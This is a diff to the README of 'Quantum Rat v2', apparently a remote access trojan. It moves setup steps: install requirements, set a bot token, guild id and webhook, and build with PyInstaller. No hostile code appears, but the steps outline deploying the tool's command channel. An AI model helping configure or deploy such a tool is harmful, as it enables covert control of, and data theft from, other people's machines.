@@ -28,9 +28,12 @@ Quantum Rat v2 is an advanced remote administration tool designed for sophistica
     ```bash
     pip install -r requirements.txt
     ```
+3. **Configuration**
+```bash
+Change the bot token and guild id in bot.py and change the webhook in main.py 
+```
 
-
-3.  **Build/Compile**
+4.  **Build/Compile**
    PyInstaller
     ```bash
     pip install pyinstaller
@@ -38,11 +41,7 @@ Quantum Rat v2 is an advanced remote administration tool designed for sophistica
     ```
     
 
-## Configuration
 
-The primary configuration involves setting up the communication channel and sensitive parameters.
-
-Change the bot token and guild id in bot.py and change the webhook in main.py 
 
 ## Usage
 
